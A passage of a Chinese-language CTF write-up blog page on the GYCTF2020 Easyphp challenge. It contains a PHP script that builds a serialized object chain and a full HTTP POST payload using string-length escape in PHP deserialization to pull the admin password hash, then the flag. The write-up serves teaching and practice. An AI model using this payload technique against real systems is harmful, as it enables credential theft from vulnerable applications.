class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age, $nickname</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = $nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo, $sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $newInfo = unserialize($newInfo);</span><br><span class="line">        $upDate = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$info = <span class="keyword">new</span> Info(<span class="string">&quot;23333&quot;</span>, <span class="string">&quot;Tiaonmmn&quot;</span>);</span><br><span class="line"><span class="comment">#echo serialize($info);</span></span><br><span class="line">$updatehelper = <span class="keyword">new</span> UpdateHelper(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">$info-&gt;CtrlCase = $db;</span><br><span class="line">$user-&gt;nickname = $info;</span><br><span class="line">$user-&gt;age = <span class="string">&quot;select password,id from username where username=?&quot;</span>;</span><br><span class="line">$updatehelper-&gt;sql = $user;</span><br><span class="line"><span class="comment">#echo serialize($updatehelper);</span></span><br><span class="line">$realinfo = <span class="keyword">new</span> Info(<span class="string">&quot;233333&quot;</span>, <span class="string">&quot;Tiaonmmn&quot;</span>);</span><br><span class="line">$realinfo-&gt;CtrlCase = $updatehelper;</span><br><span class="line"><span class="keyword">echo</span> serialize($realinfo);</span><br><span class="line"></span><br></pre></td></tr></table></figure> <code>O:4:"Info":3:&#123;s:3:"age";s:1:"1";s:8:"nickname";s:588:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:8:"CtrlCase";O:12:"UpdateHelper":3:&#123;s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:&#123;s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";s:5:"23333";s:8:"nickname";s:8:"Tiaonmmn";s:8:"CtrlCase";O:6:"dbCtrl":8:&#123;s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";N;s:6:"mysqli";N;s:5:"token";s:5:"admin";&#125;&#125;&#125;&#125;&#125;";s:8:"CtrlCase";N;&#125;</code>，这样就符合getNewInfo()的条件了。 还有一个问题，我们怎么传Payload？发包的时候我们只能输入age和nickname参数，CtrlCase没办法传进去。再回过头看源码，发现一直以来我们都忘记了一样东西 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> return的时候还有个safe函数呢。前面说过，safe函数只是简单地替换了字符，把相应字符串替换成hacker，那么原来序列化的字符串就有相当大的几率被破坏掉，PHP序列化时计算的字符串长度与实际字符串长度不对应，我们就可以逃逸出来插入我们想要的内容了。之前也有一道题<a href="https://tiaonmmn.github.io/2019/12/03/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-serialize-php/">AXB 2019 Easy serialize php</a>考这个。思路就是利用safe()函数把一个字符变成6个字符，把所有的Payload包含进去。</p>
+<p>最终Payload如下： <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/update.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: bcdbfe01-7b26-46fc-812b-4ce85bcba5ff.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://bcdbfe01-7b26-46fc-812b-4ce85bcba5ff.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: _ga=GA1.2.744187123.1582874453; PHPSESSID=2bc6e7caef6bc5c3495fe91dcf0eb6c2</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 603</span><br><span class="line"></span><br><span class="line">age=1&amp;nickname=&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;unionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:5:&quot;23333&quot;;s:8:&quot;nickname&quot;;s:8:&quot;Tiaonmmn&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure> 提交就会返回admin的MD5，注意最后面加上了一个“0-0”。 解密就可以登录，拿到flag了。</p>
+
+    <div id="aplayer-CHtdPdVE" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="22661168" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{d73e9619-0858-4478-a940-b89dbb80d7ad}</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Tiaonmmn.ZMZ
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/" title="BUUOJ刷题-Web-GYCTF2020-Easyphp">http://tiaonmmn.github.io/2020/03/04/BUUOJ刷题-Web-GYCTF2020-Easyphp/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nd/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Unserialize/" rel="tag"><i class="fa fa-tag"></i> Unserialize</a>
+              <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/03/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Ez-express/" rel="prev" title="BUUOJ刷题-Web-Ez_express">
+                  <i class="fa fa-chevron-left"></i> BUUOJ刷题-Web-Ez_express
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/03/07/Codegate-2020-renderer/" rel="next" title="Codegate CTF 2020 Preliminary renderer">
+                  Codegate CTF 2020 Preliminary renderer <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">flag{Lorem_ipsum}</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">296k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:29</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="//cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  const url = element.dataset.target;
+  const pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  const pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  const fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+<script>
+if (document.querySelectorAll('.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.7.0/dist/mermaid.min.js', () => {
+    mermaid.init({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    }, '.mermaid');
+  }, window.mermaid);
+}
+</script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+NexT.utils.loadComments('#valine-comments', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el  : '#valine-comments',
+      path: "/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/",
+    }, {"enable":true,"appId":"rGe4J3rLO75By3sjYfktvsyD-MdYXbMMI","appKey":"bpXDIRUBmowvz9tnMhIj6zs7","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":false,"comment_count":true,"recordIP":true,"serverURLs":null,"enableQQ":true,"requiredFields":[]}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
